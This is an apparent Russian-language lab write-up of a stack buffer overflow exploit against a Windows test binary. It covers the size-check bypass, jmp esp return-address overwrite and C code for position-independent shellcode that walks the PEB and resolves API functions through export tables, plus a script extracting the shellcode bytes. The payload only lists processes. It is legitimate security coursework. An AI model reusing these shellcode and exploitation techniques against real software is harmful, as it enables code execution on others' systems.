# buffer-overflow
## Изменение бинарного файла
Уязвимая функция:

<img width="578" height="413" alt="изображение" src="https://github.com/user-attachments/assets/842fbf29-f056-405f-b5a7-709aba7a8361" />

Для эксплуатации уязвимости нужно взять такое значение Size, чтобы его младшие разряды проходили проверку. Минимальное такое значение - 65536 (0x10000). Оно было добавлено в поле shell_len конфига.
Далее для увеличения размера стека были добавлены метки /start увеличивающие глубину рекурсии и рассчитано смещение от конца буфера до адреса возврата – 16 байт. Туда был записан адрес инструкции jmp esp из func.dll. После этого адреса был помещена полезная нагрузка.
Смещение между исходным буфером и адресом возврата:

<img width="785" height="235" alt="изображение" src="https://github.com/user-attachments/assets/74317102-9e68-4d8f-96eb-7f22e7b08b21" />

Измененный адрес возврата в vuln_func:

<img width="900" height="794" alt="изображение" src="https://github.com/user-attachments/assets/35b72fe0-f9e9-4402-b9e9-5d82a0efdfad" />

Таким образом, при запуске эксплойта происходит следующее:
1.    На стек копируется 65536 байт, в которых хранится шеллкод и адрес инструкции jmp esp.
2.    При выходе из функции адрес возврата меняется на адрес инструкции jmp esp. Она соответственно начинает выполнение того, что находится на вершине стека – нашей полезной нагрузки.

В результате при запуске исполняемого файла в консоль выводится список процессов:

<img width="870" height="714" alt="изображение" src="https://github.com/user-attachments/assets/56f19bde-9998-44a8-aad4-917f599cd939" />

## Работа с отладчиком
Использование скрипта mona.py в средстве отладки Immunity Debugger дало следующий результат:

<img width="994" height="165" alt="изображение" src="https://github.com/user-attachments/assets/1905a7d3-c24d-4a2d-aab4-9427ab4b3774" />

Как можно заметить, один из модулей func.dll не использует никаких средств защиты.
Также были найдены адреса инструкций call esp и jmp esp, которые можно использовать для реализации шеллкода:

<img width="555" height="223" alt="изображение" src="https://github.com/user-attachments/assets/5b92238a-11b7-4c58-9907-0221895e0081" />

## Код полезной нагрузки

Для реализации базонезависимого кода была написана программа на языке C, которая выполняет динамическое разрешение функций Windows API и работу с внутренними структурами процесса без использования таблицы импортов и фиксированных адресов.
Программа реализует следующие действия:
1.    Доступ к структуре PEB процесса
Программа получает указатель на PEB (Process Environment Block) текущего процесса через обращение к сегментному регистру FS (в 32-битной архитектуре). Это позволяет получить доступ к внутренним структурам процесса независимо от адреса загрузки исполняемого файла.
2.    Поиск загруженных модулей через PEB Loader Data
На основе поля Ldr (Loader Data – структура, хранящая список всех загруженных модулей) структуры PEB осуществляется обход списка загруженных модулей (InLoadOrderModuleList). Это позволяет определить адреса базовой загрузки системных библиотек (например, kernel32.dll) без использования стандартных функций загрузки библиотек.
3.    Сравнение имён модулей
Для поиска требуемой DLL выполняется построчное сравнение имён модулей в списке загрузки с заданным именем. Сравнение выполняется без учёта регистра символов.


``` cpp
inline LPVOID get_module_by_name(WCHAR* module_name) {
//1. Указатель на PEB
    PPEB peb = (PPEB)__readfsdword(0x30);
//2. Структура Ldr
    PPEB_LDR_DATA ldr = peb->Ldr;
//3. Список модулей
    LIST_ENTRY list = ldr->InLoadOrderModuleList;
    PLDR_DATA_TABLE_ENTRY curr = *((PLDR_DATA_TABLE_ENTRY*)(&list));
//4. Обход списка модулей
    while (curr != NULL && curr->BaseAddress != NULL) {
        if (curr->BaseDllName.Buffer == NULL) {
            curr = (PLDR_DATA_TABLE_ENTRY)curr->InLoadOrderModuleList.Flink;
            continue;
        }
//5. Сравнение имени из списка с искомым
        WCHAR* curr_name = curr->BaseDllName.Buffer;
        size_t i = 0;
        for (i = 0; module_name[i] != 0 && curr_name[i] != 0; i++) {
            WCHAR c1, c2;
            TO_LOWERCASE(c1, module_name[i]);
            TO_LOWERCASE(c2, curr_name[i]);
            if (c1 != c2) break;
        }
//6. Совпадение – возвращаем адрес
        if (module_name[i] == 0 && curr_name[i] == 0)
            return curr->BaseAddress;
        curr = (PLDR_DATA_TABLE_ENTRY)curr->InLoadOrderModuleList.Flink;
    }
    return NULL;
}
```

Таким образом мы находим базовый адрес библиотеки kernel32.dll.
Далее нужно найти адрес функции GetProcAddress. Для этого реализована функция, которая делает следующие действия:
4.    Ручной парсинг PE-структуры модуля
После получения базового адреса модуля осуществляется разбор PE-заголовков (DOS header и NT header). Из структуры извлекается адрес экспортной таблицы, содержащей список доступных функций модуля.
5.    Поиск экспортируемых функций
Программа перебирает список экспортируемых функций DLL и сравнивает их имена с требуемыми. При совпадении определяется адрес соответствующей функции в памяти.

Листинг 2. Поиск функции в библиотеке

``` cpp
inline LPVOID get_func_by_name(LPVOID module, char* func_name) {
//1. Парсинг PE-header у dll
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
//2. Получение таблицы экспортов
    IMAGE_DATA_DIRECTORY* expDir =
        &(nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    if (expDir->VirtualAddress == NULL) return NULL;
    IMAGE_EXPORT_DIRECTORY* exp =
        (IMAGE_EXPORT_DIRECTORY*)((BYTE*)module + expDir->VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)module + exp->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)module + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)module + exp->AddressOfFunctions);
//3. Поиск функции по имени в таблице
    for (SIZE_T i = 0; i < exp->NumberOfNames; i++) {
        char* curr_name = (char*)((BYTE*)module + names[i]);
        size_t k = 0;
        for (k = 0; func_name[k] != 0 && curr_name[k] != 0; k++)
            if (func_name[k] != curr_name[k]) break;
        if (func_name[k] == 0 && curr_name[k] == 0)
//4. возвращаем адрес функции
            return (BYTE*)module + funcs[ords[i]];
    }
    return NULL;
}
```

Получив адрес GetProcAddress, программа получает возможность динамически находить адреса любых экспортируемых функций Windows API во время выполнения, без использования статической таблицы импортов.
Далее программа динамически загружает и вызывает весь набор Windows API, необходимый для перечисления процессов в системе: CreateToolhelp32Snapshot для создания снимка всех текущих процессов в системе, Process32First для получения первого процесса из снимка, Process32Next для перебора остальных процессов, IsWow64Process для определения разрядности процесса, GetStdHandle и WriteConsoleA для вывода в консоль.
Затем код был собран в исполняемый файл и с помощью python-скрипта из секции .text был получен непосредственно байт-код:

``` cpp
import pefile

pe = pefile.PE("picshellcode.exe")

text_section = next(
    (s for s in pe.sections if s.Name.decode().strip('\x00') == '.text'),
    None
)

if not text_section:
    print("Секция .text не найдена")
else:
    text_bytes = text_section.get_data()
    
    with open("shellcode.txt", "w") as f:
        c_array = ', '.join(f'0x{b:02x}' for b in text_bytes)
        f.write(f'unsigned char payload[] = {{ {c_array} }};\n')
    
    print(f"[+] Извлечено {len(text_bytes)} байт")
    print("[+] Сохранено в shellcode.txt")
```





